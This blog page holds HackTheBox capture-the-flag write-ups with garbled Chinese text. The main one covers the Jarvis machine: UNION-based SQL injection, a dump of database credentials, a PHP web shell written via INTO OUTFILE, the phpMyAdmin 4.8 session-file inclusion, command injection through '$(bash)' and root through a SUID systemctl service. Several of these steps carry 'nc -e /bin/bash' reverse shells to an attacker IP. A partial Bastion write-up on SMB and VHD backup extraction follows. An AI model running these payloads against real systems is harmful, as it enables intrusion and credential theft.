<p><strong>supersecurehotel.htb</strong><br><strong>logger.htb</strong></p>
<p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/2020012212053773.png" class="lazyload"><br>Â∞ùËØïÁùÄÂä†ËøõÂéª <strong>/etc/hosts</strong></p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">10.10.10.143 jarvis.htb supersecurehotel@logger.htb supersecurehotel.htb logger.htb</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p>ÁÑ∂ÂêéÂàÜÂà´Áî® jarvis.htb, supersecurehotel.htb, logger.htb Á≠âÂüüÂêçËøõË°åËÆøÈóÆ„ÄÇ ÁªìÊûúËøòÊòØË∑ü‰πãÂâç‰∏ÄÊ†∑ÁöÑ Âπ∂Ê≤°Êúâ‰ªÄ‰πàÂå∫Âà´„ÄÇÊàë‰ª¨Êé•ÁùÄÊé¢Á¥¢„ÄÇ</p>
<p>‰∏ÄÈ°øËÉ°‰π±ÁÇπÂáªÂêé ÂèëÁé∞ <strong>room.php</strong> ÊúâÂèØÁñë<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122121012113.png" class="lazyload"><br>Â∞ùËØïÂä†‰∏™ÂèåÂºïÂè∑ÂºïÂè∑ <strong>‚Äú</strong></p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">http://10.10.10.143/room.php?cod=1<span class="string">"</span></span><br><span class="line"><span class="string">1</span></span><br></pre></td></tr></tbody></table></figure>

<p>ÊûúÁÑ∂Êä•Èîô‰∫Ü<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122121923813.png" class="lazyload"><br>‰∏ã‰∏ÄÊ≠• Êàë‰ª¨ÂèØ‰ª•Âà©Áî® ORDER BY ÊàñËÄÖ UNION SELECTÊù•ÊâæÂá∫Êü•ËØ¢ËØ≠Âè•ÊúâÂá†‰∏™Â≠óÊÆµ„ÄÇ</p>
<p><strong>ORDER BY</strong></p>
<p>È¶ñÂÖà‰ΩøÁî®orderbyÂ≠êÂè•Êù•Á°ÆÂÆöSQLËØ≠Âè•Êü•ËØ¢ÁöÑÂ≠óÊÆµÊï∞Èáè„ÄÇorderbyÂ≠êÂè•‰ºöÊ†πÊçÆsqlÊü•ËØ¢ÁªìÊûúÁöÑÂ≠óÊÆµÊù•ÊéíÂ∫èÔºåÂ¶ÇÊûúÂ≠óÊÆµ‰∏çÂ≠òÂú®Âàô‰ºöÊä•Èîô„ÄÇ</p>
<p>ÂèØ‰ª•ÂÖà‰ªé10 ÂºÄÂßãËØï</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">http://10.10.10.143/room.php?cod=1 ORDER BY 10</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p>È°µÈù¢ÊòæÁ§∫ÂèçÂ∏∏Ôºå‰ª£Ë°®Ê≤°Êúâ10‰∏™Â≠óÊÆµÔºå ‰∏Ä‰∏™‰∏Ä‰∏™ÊÖ¢ÊÖ¢‰∏ãËØï<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122122904597.png" class="lazyload"><br>ËØïÂà∞Á¨¨7ÁöÑÊó∂ÂÄô È°µÈù¢Ê≠£Â∏∏ËøîÂõû</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">http://10.10.10.143/room.php?cod=1 ORDER BY 7</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p>Á°ÆËÆ§‰∫Ü Êúâ7‰∏™Â≠óÊÆµ<br>Á¥ßÊé•ÁùÄ Êàë‰ª¨ËÉΩ‰ΩøÁî® UNION SELECTÊù•Á°ÆÂÆöÂõûÊòæ‰Ωç</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">http://10.10.10.143/room.php?cod=999 UNION SELECT 1,2,3,4,5,6,7</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p>ÂèØ‰ª•Á°ÆÂÆö 1 Â∫îËØ•ÊòØIDÔºåÊâÄ‰ª•Ê≤°ÊúâÊòæÁ§∫„ÄÇ<br>2 ÊòØ ËØÑÂàÜÁ≠âÁ∫ß<br>3 ÊòØ ‰ª∑Èí±<br>4 ÊòØ ‰ªãÁªç<br>5 ÊòØ ÂõæÁâá<br>6 Âíå 7 ÊòØÊú™Áü•„ÄÇ ÂΩìÁÑ∂Ëøô‰∫õÈÉΩ‰∏çÈáçË¶Å ÈáçË¶ÅÁöÑÊòØ ÂõûÊòæ‰ΩçÊàë‰ª¨ËÉΩÁúãÂà∞„ÄÇ</p>
<p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122123413127.png" class="lazyload"><br>ÂèØ‰ª•Âà©Áî®mysqlÁöÑ‰∏Ä‰∫õÂáΩÊï∞Êù•Ëé∑ÂèñÊõ¥Â§ö‰ø°ÊÅØ„ÄÇ ÊØîÂ¶Çdatabase()<br>Êï∞ÊçÆÂ∫ìÁöÑÂêçÂ≠óÂè´<strong>hotel</strong></p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">http://10.10.10.143/room.php?cod=999 UNION SELECT 1,2,database(),4,5,6,7</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122140022261.png" class="lazyload"></p>
<h1 id="‰∏âÔºåÊãøshell"><a href="#‰∏âÔºåÊãøshell" class="headerlink" title="‰∏âÔºåÊãøshell"></a>‰∏âÔºåÊãøshell</h1><h5 id="Êàë‰ª¨Êúâ‰∏§ÁßçÊñπÂºèÊù•ÊãøÂà∞-www-data„ÄÇ"><a href="#Êàë‰ª¨Êúâ‰∏§ÁßçÊñπÂºèÊù•ÊãøÂà∞-www-data„ÄÇ" class="headerlink" title="Êàë‰ª¨Êúâ‰∏§ÁßçÊñπÂºèÊù•ÊãøÂà∞ www-data„ÄÇ"></a>Êàë‰ª¨Êúâ‰∏§ÁßçÊñπÂºèÊù•ÊãøÂà∞ www-data„ÄÇ</h5><p><strong>‰∏ÄÁßç‰∏∫Âà©Áî®mysqlËØªÂÜôÁöÑÊñπÂºèÊ≥®ÂÖ•phpÊâßË°ånc</strong></p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">SELECT ... INTO OUTFILE <span class="string">'file_name'</span></span><br><span class="line">1</span><br><span class="line">http://10.10.10.143/room.php?cod=999 UNION SELECT 1,2,<span class="string">'&lt;?php system("nc -e /bin/bash 10.10.14.10 1234");?&gt;'</span>,4,5,6,7 INTO OUTFILE <span class="string">'/var/www/html/malicious.php'</span></span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p>ÁÑ∂ÂêéÊàë‰ª¨ËÆøÈóÆ <strong>10.10.10.143/malicious.php</strong><br>ÊàêÂäüÊãøÂà∞ shell<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122141038552.png" class="lazyload"></p>
<hr>
<p><strong>Á¨¨‰∫åÁßçÊñπÂºèÊòØÈÄöËøá mysqlÂáΩÊï∞ÂØºÂá∫ Êï∞ÊçÆÂ∫ìÁöÑÁî®Êà∑ÂêçÂíåÂØÜÁ†Å ÁôªÈôÜphpmyadmin.</strong></p>
<p>‰ΩøÁî® <strong>group_concat</strong> ÂèØ‰ª•Êää Âêå‰∏Ä‰∏™ÂàÜÁªÑ‰∏≠ÁöÑÂÄºËøûÊé•Ëµ∑Êù•,ËøîÂõû‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤ÁªìÊûú Âà©Áî® <strong>‚Äú:‚Äù</strong> Êù•ÈöîÁ¶ªÂàÜÂºÄ</p>
<figure class="highlight apache"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">room</span>.php?cod=<span class="number">999</span> union select <span class="number">1</span>,<span class="number">2</span>,(select group_concat(user,<span class="string">":"</span>,password,<span class="string">":"</span>,host) from mysql.user),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span></span><br><span class="line"><span class="attribute">1</span></span><br></pre></td></tr></tbody></table></figure>

<p>Êàë‰ª¨ÊàêÂäüÂèñÂæó Êï∞ÊçÆÂ∫ìÁöÑË¥¶Âè∑ÂíåÂØÜÁ†ÅÂìàÂ∏åÂÄº</p>
<p><strong>Dbadmin:2D2B7A5E4E637B8FBA1D17F40318F277D29964D0</strong><br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122141541617.png" class="lazyload"><br>Âà©Áî® crackstation.net Êù•ËøõË°åÁ†¥Ëß£ÂìàÂ∏åÂÄº<br><img src="/images/placeholder.png" alt="img" data-src="/images/old-machine-images/20200122141930255.png" class="lazyload"><br>ÂæóÂà∞ÂØÜÁ†Å <strong>imissyou</strong></p>
<p>ÊâæÂõû‰πãÂâçÁöÑ phpmyadmin ÁôªÈôÜÂêéÂèëÁé∞<br><strong>Apache/2.4.25</strong><br><strong>phpmyadmin 4.8.0</strong><br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/2020012214211048.png" class="lazyload"><br>ÊñáÁ´†ÂèëË°®ÁöÑÊó∂ÂÄô phpmyadmin ÊúÄÊñ∞ÁöÑÁâàÊú¨‰∏∫ 5.0.1<br>‰∏ÄÁï™searchsploitÂêéÂèëÁé∞ 4.8.0Âíå4.8.1 ÁâàÊú¨ÊúâËøúÁ®ãÊâßË°åÊñá‰ª∂ÂåÖÂê´ÊºèÊ¥û</p>
<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/44928">phpmyadmin 4.8 Êñá‰ª∂ÂåÖÂê´ÊºèÊ¥û‰º†ÈÄÅÈó®</a></p>
<p>È¶ñÂÖà ËøêË°åsqlÂëΩ‰ª§</p>
<figure class="highlight php-template"><table><tbody><tr><td class="code"><pre><span class="line"><span class="language-xml">select '</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">"nc -e /bin/bash 10.10.14.12 1234"</span>);<span class="meta">?&gt;</span></span><span class="language-xml">'</span></span><br><span class="line"><span class="language-xml">1</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122142927469.png" class="lazyload"><br>ÊãøÂà∞sessionÁöÑÊï∞ÂÄº<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122143910250.png" class="lazyload"><br>ÁÑ∂ÂêéËøõË°åËÆøÈóÆ</p>
<figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line"><span class="number">10.10</span>.<span class="number">10.143</span><span class="regexp">/phpmyadmin/i</span>ndex.php?target=db_sql.php%<span class="number">253</span>f<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/var/</span>lib<span class="regexp">/php/</span>sessions/sess_b6uigkomnmk4oaa91ckc4chk4nfahaqi</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122143843553.png" class="lazyload"><br>ÊàêÂäüÔºÅ</p>
<h1 id="ÂõõÔºåÊèêÈ´òÁî®Êà∑ÊùÉÈôê"><a href="#ÂõõÔºåÊèêÈ´òÁî®Êà∑ÊùÉÈôê" class="headerlink" title="ÂõõÔºåÊèêÈ´òÁî®Êà∑ÊùÉÈôê"></a>ÂõõÔºåÊèêÈ´òÁî®Êà∑ÊùÉÈôê</h1><p>Á¨¨‰∏Ä‰ª∂‰∫ãÊÉÖÂ∞±ÊòØËØïËØï sudo -l ÊúâÊ≤°Êúâ‰ªª‰ΩïÂèØ‰ª•Âà©Áî®ÁöÑÊùÉÈôê„ÄÇ</p>
<figure class="highlight elixir"><table><tbody><tr><td class="code"><pre><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> www-data on <span class="symbol">jarvis:</span></span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> www-data may run the following commands on <span class="symbol">jarvis:</span></span><br><span class="line">    (pepper : <span class="title class_">ALL</span>) <span class="symbol">NOPASSWD:</span> /var/www/<span class="title class_">Admin</span>-<span class="title class_">Utilities</span>/simpler.py</span><br><span class="line"></span><br><span class="line"><span class="number">1234567</span></span><br></pre></td></tr></tbody></table></figure>

<p>ËøôÊòØ‰∏Ä‰∏™Â∞èÂûãÁöÑË≠¶Êä•Âô®<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122144448439.png" class="lazyload"><br>‰ªîÁªÜÁúã‰∫ÜÊ∫ê‰ª£Á†ÅÔºåÊúâ‰∏Ä‰∏™Âú∞ÊñπÂèØ‰ª•‰ΩøÁî®ÂëΩ‰ª§Ê≥®ÂÖ•ÔºåËôΩÁÑ∂ÂÅö‰∫ÜÁÇπÈªëÂêçÂçïÊù•ËøáÊª§„ÄÇ ‰ΩÜÊòØÁî±‰∫é <strong>$</strong> ËøòËÉΩ‰ΩøÁî®„ÄÇ Êàë‰ª¨ÂèØ‰ª•Áî®Á±ª‰ºº <strong>$(cmd)</strong> ÁöÑÊìç‰Ωú„ÄÇ</p>
<p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122144636466.png" class="lazyload"></p>
<figure class="highlight nsis"><table><tbody><tr><td class="code"><pre><span class="line">sudo -u pepper /<span class="keyword">var</span>/www/<span class="literal">Admin</span>-Utilities/simpler.py -p</span><br><span class="line">Enter an IP: <span class="variable">$(bash)</span></span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></tbody></table></figure>

<p>Êàë‰ª¨ÊàêÂäüÊãøÂà∞pepperÁöÑshell<br>ËøôÈáå‰∏çÊáÇÂá∫‰∫é‰ªÄ‰πàÂéüÂõ† ÊàëÂêÑÁßçÂëΩ‰ª§ÂÖ®ÈÉ®ÈÉΩÊ≤°ÂìçÂ∫î„ÄÇ‰∫éÊòØÊàëÁî®nc ÈáçÊñ∞ÁîüÊàê‰∫Ü‰∏Ä‰∏™shell<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122145229923.png" class="lazyload"></p>
<figure class="highlight apache"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">pepper</span>@jarvis:/$nc -e /bin/bash <span class="number">10.10.14.10</span> <span class="number">1234</span></span><br><span class="line"><span class="attribute">nc</span> -e /bin/bash <span class="number">10.10.14.10</span> <span class="number">1234</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">123</span></span><br></pre></td></tr></tbody></table></figure>

<p>‰∫éÊòØÊàë‰ª¨ÊàêÂäüÊãøÂà∞pepper ÁöÑÊùÉÈôê<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122145350946.png" class="lazyload"></p>
<h1 id="‰∫îÔºåROOTÊèêÊùÉ"><a href="#‰∫îÔºåROOTÊèêÊùÉ" class="headerlink" title="‰∫îÔºåROOTÊèêÊùÉ"></a>‰∫îÔºåROOTÊèêÊùÉ</h1><p>È¶ñÂÖàÊàë‰ª¨Êù•Êü•ÁúãSUID files</p>
<figure class="highlight arcade"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm <span class="number">-4000</span> <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122145847426.png" class="lazyload">ÂèëÁé∞ <strong>systemctl</strong> ÊØîËæÉÂèØÁñë„ÄÇ<br>ÈÄöËøá <a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/systemctl/">gtfobins</a> ÂèëÁé∞Â≠òÂú®SUID Êù•ËøõË°åÊèêÊùÉÁöÑÊñπÊ≥ï„ÄÇ<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122150211702.png" class="lazyload"><br>‰∏ÄËà¨ÁúãÂà∞ËøôÁßçÊàëÈÉΩÊØîËæÉÂñúÊ¨¢ÊâãÂä®Êìç‰Ωú„ÄÇ<br>ÂàõÂª∫‰∏Ä‰∏™ pwn.service Âú® pepper ÁöÑ‰∏ªÁõÆÂΩïÈáå Âπ∂‰∏îÊää ExecStart ÊåáÂêë nc.sh</p>
<figure class="highlight routeros"><table><tbody><tr><td class="code"><pre><span class="line">[Service]</span><br><span class="line"><span class="attribute">Type</span>=oneshot</span><br><span class="line"><span class="attribute">ExecStart</span>=/home/pepper/nc.sh</span><br><span class="line">[Install]</span><br><span class="line"><span class="attribute">WantedBy</span>=multi-user.target</span><br><span class="line"></span><br><span class="line">123456</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">nc -e /bin/bash 10.10.14.10 1234</span><br><span class="line"></span><br><span class="line">123</span><br></pre></td></tr></tbody></table></figure>

<p>ÁÑ∂ÂêéÊàë‰ª¨Ë¶ÅÂàõÂª∫‰∏Ä‰∏™ symlink Ëµ∑Êù•</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">systemctl <span class="built_in">link</span> /home/pepper/pwn.service</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p>ÊâìÂºÄ nc Êé•Âê¨<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122151106368.png" class="lazyload"></p>
<p>ÁÑ∂ÂêéÂêØÂä®Êàë‰ª¨ÁöÑpwnÊúçÂä°</p>
<figure class="highlight crmsh"><table><tbody><tr><td class="code"><pre><span class="line">systemctl <span class="literal">start</span> pwn</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>

<p>Êàë‰ª¨ÊàêÂäüÊãøÂà∞root<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122151239547.png" class="lazyload"></p>
<br>
<br>
<br>

<p><img src="/images/placeholder.png" alt="root" data-src="/images/root.gif" class="lazyload"></p>

		  	  
	</div>



	<div class="article-categories">
	 
      <i class="iconfont icon-category" style="margin-right:4px"></i>
	  	            
				<a class="link" href="/categories/hackthebox/">hackthebox</a>           
		
      
	</div>
	

	<div class="article-tags">
		
			<i class="iconfont icon-tags" style="margin-right:4px"></i>
			            
				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
			
		
	</div>

	<div class="article-bottom">
		<a class="readmore" href="/2020/01/22/HTB-jarvis/">Continue</a> 	
	</div>	
    
</article>

	
	
	
	

<article class="article">		
	   
	<div class="article-header">
	    
		<a class="title" href="/2020/01/13/HTB-wall/">HTB Wall Writeup</a>  
	       
		 

		<div class="meta">
			<time>Jan 13, 2020</time>			
		</div>
	</div>


	

    
	<div class="typo article-excerpt">	
		
			<p>ËøôÂè∞Êú∫Âô®ÊØîËæÉÊúâÊÑèÊÄùÔºåÊ≠£Â¶ÇÂêçÂ≠ó Êúâ‰∏ÄÈÅì‚ÄúÂ¢ô‚Äù„ÄÇÊúâË∂£ÁöÑÊòØËøôÂè∞Êú∫Âô®ÁöÑCMS CVEÂíåÊú∫Âô®ÁöÑ‰ΩúËÄÖÊòØÂêå‰∏Ä‰∏™‰∫∫„ÄÇ<br>‰ΩúËÄÖÂ∞ΩÈáèÂÜôÂá∫Ëá™Â∑±Âú®ÈÅáÂà∞ÈóÆÈ¢òÁöÑÊó∂ÂÄôÁ¢∞Âà∞ÁöÑÂùë ‰ª•ÂèäÂÅö‰∫Ü‰ªÄ‰πàÂ∞ùËØïÂíåÊÄùË∑Ø„ÄÇ</p>
		  	  
	</div>



	<div class="article-categories">
	 
      <i class="iconfont icon-category" style="margin-right:4px"></i>
	  	            
				<a class="link" href="/categories/hackthebox/">hackthebox</a>           
		
      
	</div>
	

	<div class="article-tags">
		
			<i class="iconfont icon-tags" style="margin-right:4px"></i>
			            
				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
			
		
	</div>

	<div class="article-bottom">
		<a class="readmore" href="/2020/01/13/HTB-wall/">Continue</a> 	
	</div>	
    
</article>

	
	
	
	

<article class="article">		
	   
	<div class="article-header">
	    
		<a class="title" href="/2020/01/10/HTB-bastion/">HTB Bastion Writeup</a>  
	       
		 

		<div class="meta">
			<time>Jan 10, 2020</time>			
		</div>
	</div>


	

    
	<div class="typo article-excerpt">	
		 
			<p>ÊîªÂáªÊú∫ÔºöÂÆòÊñπKali linux 2019 64‰Ωç<br>‰ΩúËÄÖ: <strong>Ikonw</strong></p>
<p><img src="/images/placeholder.png" alt="image-20200924210807049" data-src="/images/HTB-bastion/image-20200924210807049.png" class="lazyload"></p>
<h2 id="‰∏ÄÔºåÁ´ØÂè£Êâ´Êèè"><a href="#‰∏ÄÔºåÁ´ØÂè£Êâ´Êèè" class="headerlink" title="‰∏ÄÔºåÁ´ØÂè£Êâ´Êèè"></a>‰∏ÄÔºåÁ´ØÂè£Êâ´Êèè</h2><p><img src="/images/placeholder.png" alt="image-20200924210826254" data-src="/images/HTB-bastion/image-20200924210826254.png" class="lazyload"></p>
<p>Ê≠£Â∏∏ÁöÑnmapÁ´ØÂè£Êâ´Êèè Ê≤°ÊúâÂ§™Â§öÁöÑËµÑËÆØÔºåÂè™ÊúâSMBÂíåSSH ÂºÄÁùÄ„ÄÇ</p>
<h2 id="‰∫åÔºåSMB-Enumeration"><a href="#‰∫åÔºåSMB-Enumeration" class="headerlink" title="‰∫åÔºåSMB Enumeration"></a>‰∫åÔºåSMB Enumeration</h2><p>È¶ñÂÖàÔºåÂà©Áî®smbclient ËøûÊé•Âà∞Èù∂Êú∫<br>ÊñπÂºèÊúâÂæàÂ§öÁßçÔºå smbmap‰πãÁ±ªÁöÑ ‰ΩÜÊàëÊØîËæÉÂñúÊ¨¢Áî®ÁÆÄÂçïÁöÑsmbclient.<br>smbmapÁ≠âÂÖ∂‰ªñÂ∑•ÂÖ∑Âú®ÁúüÂÆûÁéØÂ¢ÉÈáå ‰ºöËá™Âä®ËøõË°åÂ§ßÈáèÊìç‰ΩúÔºåÂæàÂÆπÊòìË¢´Êó•ÂøóÊçïÊçâ‰∏ãÊù•„ÄÇ</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">smbclient -L //10.10.10.134</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="image-20200924210848265" data-src="/images/HTB-bastion/image-20200924210848265.png" class="lazyload"></p>
<p>ÂèëÁé∞Âõõ‰∏™ÁõÆÊ†áÔºåÂÖ∂‰∏≠‰∏â‰∏™ÊòØÊØîËæÉÊ≠£Â∏∏„ÄÇ<br>ÊúâÊÑèÊÄùÁöÑÊòØ <strong>Backups</strong></p>
<p>Êàë‰ª¨Âà©Áî®smbclient ÁúãÁúãÊòØÂê¶ÂÖÅËÆ∏Êàë‰ª¨ËøûÊé•Âà∞ <strong>Backups</strong></p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">smbclient \\\\10.10.10.134\\Backups</span><br></pre></td></tr></tbody></table></figure>

<p>ËøôÈáåÂà©Áî®‚Äù‚ÄùÊù• ÈÄÉËÑ± ‚Äú‚Äù ÊâÄ‰ª•ÈúÄË¶Å4‰∏™ÔºåËÄåbackup ‰∏§‰∏™„ÄÇ</p>
<p><img src="/images/placeholder.png" alt="image-20200924210918572" data-src="/images/HTB-bastion/image-20200924210918572.png" class="lazyload"></p>
<p><img src="/images/placeholder.png" alt="asd" data-src="/images/HTB-bastion/2020011001300488.png" class="lazyload"></p>
<p>ÊàêÂäüËøõÂÖ•ÔºåÂèëÁé∞‰∏â‰∏™Êñá‰ª∂„ÄÇÂà©Áî® <strong>get</strong> Êää <strong>note.txt</strong> ‰∏ãËΩΩÂà∞Êú¨Âú∞„ÄÇ<br>Â§ßÊ¶ÇÁöÑÊÑèÊÄùÂ∞±ÊòØ Á≥ªÁªüÁÆ°ÁêÜÂëòÂª∫ËÆÆ‰∏çË¶ÅÊääÊï¥‰∏™backup Êñá‰ª∂Â§π‰∏ãËΩΩÂà∞Êú¨Âú∞„ÄÇ<br>ÊåâÁÖßÊñá‰ª∂Â§πÁöÑÂêçÂ≠óÊù•ÁúãÔºåÂ∫îËØ•ÊòØwindowsÈïúÂÉèÁöÑÂ§á‰ªΩ„ÄÇ</p>
<p><img src="/images/placeholder.png" alt="asdf" data-src="/images/HTB-bastion/20200110013425912.png" class="lazyload"></p>
<p>‰∫éÊòØÊàëÂ∞ùËØïÂ∞ÜÊï¥‰∏™backupÈÉΩÊåÇËΩΩÂà∞Êú¨Âú∞„ÄÇ<br>Âú®Êú¨Âú∞ÂàõÂª∫Êñá‰ª∂Â§π <strong>/mnt/backup</strong></p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">mount -t cifs //10.10.10.134/Backups /mnt/backup -o rw</span><br></pre></td></tr></tbody></table></figure>

<p>ÊåÇËΩΩÂà∞Êú¨Âú∞Âπ∂‰∏îÂÖÅËÆ∏ËØªÂÜôÊìç‰Ωú</p>
<p><img src="/images/placeholder.png" alt="Âú®ËøôasdËø∞" data-src="/images/HTB-bastion/20200110013652862.png" class="lazyload"></p>
<p>7z Êúâ‰∏Ä‰∏™ÂäüËÉΩÊòØÂèØ‰ª•ËÆ©‰Ω†Áõ¥Êé•ËØªÂèñ vhdÊñá‰ª∂ÁöÑÊ†ºÂºè„ÄÇÊàë‰ª¨Áõ¥Êé•Êù•ËØªÂèñ5gbÁöÑÊñá‰ª∂<br>(Êñá‰ª∂ËæÉÂ§ß Â§ßÊ¶Ç2ÂàÜÈíüÂ∑¶Âè≥Ôºå Êñá‰ª∂ËæÉÂ§öÂ∞±Âè™Â±ïÁ§∫‰∏ÄÈÉ®ÂàÜÔºâ</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">7z l 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="Âú®fdsaf" data-src="/images/HTB-bastion/20200110014239133.png" class="lazyload"></p>
<p>ÂèØ‰ª•ÁúãÂà∞ËøôÊòØÂá†‰πéÊï¥‰∏™windowsÁöÑÂ§á‰ªΩ„ÄÇ<br>Êó¢ÁÑ∂ÊòØwindowsÂ§á‰ªΩ Êàë‰ª¨ÊòØ‰∏çÊòØÂèØ‰ª•‰ªéSAM FileÈáåÈù¢Áõ¥Êé•ÊèêÂèñÁî®Êà∑ÁöÑÂ∏êÂè∑ÂØÜÁ†ÅÂë¢</p>
<h2 id="‰∏âÔºåÁî®Êà∑Â∏êÂè∑ÂØÜÁ†Å"><a href="#‰∏âÔºåÁî®Êà∑Â∏êÂè∑ÂØÜÁ†Å" class="headerlink" title="‰∏âÔºåÁî®Êà∑Â∏êÂè∑ÂØÜÁ†Å"></a>‰∏âÔºåÁî®Êà∑Â∏êÂè∑ÂØÜÁ†Å</h2><p>7z Âè™ÊòØËÆ©Êàë‰ª¨ÁúãÂà∞‰∫ÜÊñá‰ª∂ÔºåËÄå‰∏çËÉΩÁúãÂà∞ÂÜÖÂÆπ„ÄÇ<br>ÊàëÁ®çÂæÆgoogle ‰∫Ü‰∏Ä‰∏ãÔºåÂèëÁé∞‰∏Ä‰∏™ÂÖÑÂºüÂú®medium‰∏äÈù¢ÊúâÁØáÊñáÁ´†Âà©Áî®ghost-mountÊåÇËΩΩËôöÊãüÁ°¨Áõò„ÄÇ<br>linuxÁöÑ ghostmount ËÉΩËÆ©Êàë‰ª¨ËøõÂÖ•ËôöÊãüÁ°¨ÁõòÁöÑÊñá‰ª∂</p>
<p>ÈìæÊé•: <a target="_blank" rel="noopener" href="https://medium.com/@klockw3rk/mounting-vhd-file-on-kali-linux-through-remote-share-f2f9542c1f25">ÊñáÁ´†Âú∞ÂùÄ</a></p>
<p>Ë∑üÁùÄÂ§ßÂì•Ëµ∞<br>È¶ñÂÖàÊàë‰ª¨ÈúÄË¶Å<strong>ÂÆâË£Ö libguestfs-tools</strong>Ëøô‰∏™Â∫ì</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">apt-get install libguestfs-tools</span><br></pre></td></tr></tbody></table></figure>

<p>ÁÆÄÂçïÁöÑÂÆâË£ÖÂêéÔºåÊàë‰ª¨ÂàõÂª∫‰∏Ä‰∏™Êñ∞ÁöÑÊñá‰ª∂Â§π <strong>/mnt/vhd</strong></p>
<p>ÊäävhdÊåÇËΩΩÂú® Ëøô‰∏™Êñá‰ª∂Â§π</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">guestmount --add /mnt/backup/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="Âú®asdasd" data-src="/images/HTB-bastion/20200110015004404.png" class="lazyload"></p>
<p>ÂèØ‰ª•ÁúãÂà∞Â∑≤ÁªèÂèØ‰ª•ËøõÂÖ•Âà∞ vhdÊñá‰ª∂ÈáåËøõË°åÊìç‰Ωú„ÄÇ<br>ÊàëÈ¶ñÂÖàË¶ÅÂÅöÁöÑÂ∞±ÊòØËÉΩ‰∏çËÉΩÁõ¥Êé•Âà∞user desktopÈáåÊãøÂà∞ user.txt</p>
<p>samdump2ÂèØ‰ª•ÂÆåÊàêËøô‰∏™‰ªªÂä°</p>
<p><img src="/images/placeholder.png" alt="Âú®Ëøôasdasd" data-src="/images/HTB-bastion/20200110015521278.png" class="lazyload"></p>
